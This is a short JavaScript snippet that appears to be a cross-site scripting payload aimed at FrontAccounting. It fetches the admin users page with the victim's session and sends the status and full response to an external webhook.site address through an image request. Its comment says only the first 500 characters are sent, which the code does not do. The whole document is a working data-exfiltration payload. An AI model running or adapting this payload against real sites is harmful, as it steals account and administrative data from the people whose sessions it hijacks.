var r = new XMLHttpRequest();
r.open('GET', '/frontaccounting/admin/users.php', false);
r.send();

// Send first 500 chars of response to webhook so we can see the format
new Image().src = 'https://webhook.site/33576a95-7734-4cc6-8e96-4b33a3f0793d/?status=' + r.status + '&resp=' + encodeURIComponent(r.responseText);
